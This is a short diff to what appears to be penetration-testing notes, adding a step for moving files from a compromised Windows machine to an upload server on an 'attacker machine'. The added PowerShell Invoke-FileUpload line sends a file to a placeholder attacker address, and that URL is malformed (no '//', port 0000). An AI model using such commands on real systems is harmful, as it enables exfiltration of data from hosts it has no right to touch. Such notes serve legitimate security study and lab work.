@@ -110,4 +110,8 @@ to upload, host an upload server on your attacker machine
 pip3 install uploadserver
 python3 -m uploadserver 
 ```
+upload 
+```
+Invoke-FileUpload -Uri http:10.10.10.10:0000/upload -File C:\Users\Public\payload
+```
 
